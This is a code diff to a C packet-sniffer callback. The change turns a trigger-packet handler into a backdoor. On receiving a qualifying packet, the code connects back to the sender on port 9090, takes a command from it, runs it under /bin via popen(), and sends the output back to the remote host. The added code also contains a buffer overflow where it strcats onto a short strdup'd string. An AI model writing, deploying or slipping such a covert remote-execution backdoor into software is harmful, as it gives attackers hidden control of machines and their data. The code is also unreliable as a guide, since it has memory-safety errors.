@@ -86,12 +86,15 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
     const struct tcphdr *tcph = NULL;
     struct sockaddr_in server;
     struct hostent *hp;
-    char *host, *encryptedField;
+    int bytes_to_read, n;
+    char *host, *encryptedField, *bp, buf[80], *command;
     char *code = malloc(sizeof(char) * 4);
     char strtosend[80];
     char Date[11];
     time_t t;
     struct tm* tm;
+    FILE *fp;
+    char path[1035];
     
     time(&t);
     tm = localtime(&t);
@@ -147,7 +150,7 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
         
         bzero((char *)&server, sizeof(struct sockaddr_in));
         server.sin_family = AF_INET;
-        server.sin_port = htons(9000);
+        server.sin_port = htons(9090);
         
         inet_ntop(AF_INET, &(iph->ip_src), host, (socklen_t) INET_ADDRSTRLEN);
         if((hp = gethostbyname(host)) == NULL){
@@ -159,9 +162,42 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
             systemFatal("can't connect to server\n");
         }
         
-        strcpy(strtosend, host);
-        send(sd, strtosend, 80, 0);
+        // receive command
+        bp = buf;
+        bytes_to_read = 80;
+        
+        while((n = recv(sd, bp, bytes_to_read, 0)) < 80 )
+        {
+            bp += n;
+            bytes_to_read -= n;
+        }
+        printf("%s\n",buf);
+        
+        command = strdup("/bin/");
+        strcat(command, buf);
+        
+        printf("%s\n", command);
+        
+        /* Open the command for reading. */
+        fp = popen(command, "r");
+        
+        if (fp == NULL) {
+            systemFatal("Failed to run command");
+        }
+        
+        /* Read the output a line at a time - output it. */
+        while (fgets(path, sizeof(path)-1, fp) != NULL) {
+            //send results
+            strcpy(strtosend, path);
+            send(sd, strtosend, 80, 0);
+            printf("%s\n", path);
+        }
+        
+        /* close */
+        pclose(fp);
+
         free(host);
+        close(sd);
         free(code);
     }
 }
